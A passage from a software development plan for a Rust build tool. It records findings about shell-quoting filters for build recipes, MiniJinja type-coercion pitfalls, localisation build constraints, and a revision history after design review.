  `format_command` in `src/stdlib/command/filters.rs:126-149` is the only
  consumer. Impact: it is the wrong quoter to reuse for recipe text, despite
  its name.
- Observation: a new message key must be added to all 35 catalogues or
  `cargo build` fails through `build.rs:291`. Evidence:
  `build_l10n_audit/compare.rs:159-172`;
  `tests/build_l10n_audit_tests.rs:136-147`;
  `docs/developers-guide.md:285-302`. Impact: dominates the mechanical effort;
  drives R1 and the "run `cargo build` first" step in EP-M4.
- Observation: there is no parity test between `register_with_config` and
  `register_manifest_query`; the disabled `env` stub's arity is maintained by
  hand. Evidence: `src/stdlib/register.rs:173-176`; no enumeration test found.
  Impact: drives R8 and OBL-QUERY-SURFACE. A general parity test is worth a
  future roadmap item but is out of scope here.
- Observation: `shell-quote`'s `Sh` encoder emits *fragmented* quoting, and it
  does not treat the equals sign as inert. `a b` becomes `a' b'`, and
  `target-cpu=native` becomes `target-cpu'=native'`. Evidence: `escape_chars`
  and `Char::from` in `shell-quote-0.7.2/src/sh.rs` and `src/ascii.rs`; the
  inert set is exactly alphanumerics plus comma, full stop, solidus,
  underscore, and hyphen. Both forms were round-tripped through a real
  `/bin/sh`, and `set -- -C target-cpu'=native' a' b'; echo $#` reports `3`.
  Impact: every expected string in the behavioural specification and the
  acceptance transcript is fixed by this, not by taste. A reviewer who "tidies"
  `a' b'` into `'a b'` is changing the crate's output, not the plan's.

- Observation: `shell_quote` is correct only in **unquoted** argv position.
  Inside `"..."` it inserts its own quote characters as data. Evidence:
  `sh -c 'printf "%s\n" "RUSTFLAGS=-D'"'"' warnings'"'"'"'` prints
  `RUSTFLAGS=-D' warnings'`, quote characters included. The first draft's
  acceptance transcript contained exactly this defect, and none of its nine
  obligations would have caught it, because every one exercised the filter in
  isolation. Impact: drives OBL-CONTEXT, the corrected transcripts, and the
  guide precondition. It also explains why `{{ ins }}`/`{{ outs }}` are handled
  by a shell-context tracker rather than a filter — the tracker is the stronger
  mechanism, and ADR-021 should name it as the intended successor.
- Observation: `Value::try_iter()` is not a sequence check.
  Evidence: `minijinja-2.24.0/src/value/mod.rs::try_iter` returns an empty
  iterator for `None` and `Undefined`, characters for a string, and an object's
  own iteration (a map's keys) for `Object`; only numbers and booleans are
  rejected. Impact: `{{ 'abc' | shell_join }}` would have quoted three
  characters into a command line. Drives D8 and OBL-KIND-GATE.
- Observation: `Kwargs::get::<Option<String>>` silently stringifies rather than
  raising a type error. Evidence: verified against `minijinja 2.24.0` —
  `default=['a','b']` yields the string `["a", "b"]`, and `default=true` yields
  `"True"`. Impact: the first draft's D4 would have pasted JSON into a shell
  recipe, in direct violation of RFC 0006 §6.6. Drives the revised D4.
- Observation: `src/manifest/mod.rs` is exactly 400 lines, the constraint-8 cap.
  Evidence: `wc -l src/manifest/mod.rs`. Impact: EP-M1's first edit would
  breach the cap; drives the extraction step, which also converges with the
  in-flight `issue-651` branch (R9).
- Observation: 64 real `sh` subprocess spawns take about 86 ms, not seconds.
  Evidence: measured on this machine. Impact: retires the batching idea; the
  plan's 10-second budget had two orders of magnitude of headroom, and batching
  would have broken proptest shrinking.

- Observation: fenced examples in `README.md`, `docs/users-guide.md`, and
  `docs/stdlib-yaml-and-jinja-guide.md` are executed, and their identifiers are
  pinned by a hand-maintained registry. Evidence:
  `tests/documentation_examples/mod.rs:15-21`;
  `tests/documentation_examples_tests.rs:18-61,143`. Impact: the `RUSTFLAGS`
  documentation is real acceptance evidence, not prose.

## Outcomes & retrospective

To be completed at EP-M5. Before setting this plan to `COMPLETE`, reconcile
every discovery against the `Conformance basis`:

- D2 is a deviation from `RFC-0006-8.9`. It must be recorded in ADR-021 and the
  RFC amended, or the plan stays `BLOCKED`.
- `RM-6.8.3` is materially reduced by D1 and D2. Record the reduction as a note
  on that roadmap entry; do not tick it, because its `dialect` value set is
  wider than what ships here.
- If EP-M4's runner plumbing proves larger than tolerance 1 allows, stop and
  record the measurement. Do **not** resolve it by shipping the
  host-default-only behaviour and deferring the plumbing: that recreates R11's
  silent-corruption path, which constraint 10 forbids. The correct escalation
  is to propose deferring the *filters* as well, leaving EP-M1 to EP-M3
  shipped, and to raise the plumbing as its own roadmap item.

## Artefacts and notes

To be filled during implementation. Required entries:

1. The `red` transcript for EP-M1 showing the unknown-keyword failure.
2. The name of the snapshot that failed during the OBL-NINJA-STABLE
   non-vacuity check, and the transcript showing it passing again after revert.
3. The transcript of each negative control failing as designed
   (naive double-quote quoter, naive `join(" ")`, naive truthiness `compact`,
   POSIX-quoted input fed to the PowerShell decoder).
4. The real `shell-quote` output for the witness `a b '$HOME'`, used to correct
   the BDD expectations and the "Validation and acceptance" transcript.
5. `git status --short src/snapshots tests/snapshots` showing no output at each
   milestone boundary.

## Revision note

- 2026-09-08: initial draft.
- 2026-09-09: revised after a six-lens community-of-experts design review.

  **What changed.** Three MiniJinja behaviours the draft asserted were
  falsified by direct experiment and are now corrected:
  `Kwargs::get::<Option<String>>` stringifies rather than raising (D4),
  `Value::try_iter()` accepts maps, strings, and `none` (D8), and a positional
  argument yields a detail-free `TooManyArguments` (AX-4). The `quote_path`
  citation pointed at the wrong file. The encoder inventory said three where
  there are five. The acceptance transcript placed the interpolation inside
  double quotes, where the quoting corrupts the value rather than protecting it
  — the plan's own worst failure mode, in the plan's own example, invisible to
  all nine original obligations. Three module boundaries were redrawn: the
  encoder into a `src/shell_word.rs` leaf so `src/recipe_shell.rs` stays
  data-only; the stdlib module named `recipe_text` so it does not collide with
  `src/stdlib/command/`, which already owns a filter named `shell`; and the
  `ShellDialect` inverse deleted because the mapping is three-to-two. The
  control-character rule is reused from `validate_ninja_value` rather than
  reimplemented for a third time, and constraint 4 became a `clippy.toml` gate
  instead of prose. A threat model now names the attacker instead of repeating
  "non-negotiable security feature" unqualified. Five obligations were added
  (OBL-CONTEXT, OBL-JOIN-QUOTE-AGREE, OBL-KIND-GATE, OBL-COMPOSITION,
  OBL-NO-ESCAPE) and the behavioural scenarios now assert on the stable
  `[netsuke::jinja::…]` codes rather than English prose that thirty-two
  catalogues would translate away.

  **Why it changed the shape of the work.** The former EP-M4 and EP-M5 are now
  one milestone. Splitting them would have shipped a state where, on a Windows
  host with `NETSUKE_WINDOWS_SHELL=bash`, the filters quote for PowerShell
  while the recipe runs under Bash — and PowerShell's doubled single quote is
  *valid* POSIX syntax, so `a'b` silently becomes `ab` with no error anywhere.
  That is R11, and constraint 10 now forbids it.

  **Effect on remaining work.** Message keys rose from five to eleven, so the
  translation burden roughly doubles; decision D11 records the alternative that
  would cut it to one, and is cheap to adopt before EP-M4 and expensive after.
  EP-M1 gains a preparatory extraction because `src/manifest/mod.rs` is exactly
  at the 400-line cap. Milestone count fell from six to five. The plan still
  awaits approval; no implementation has begun.
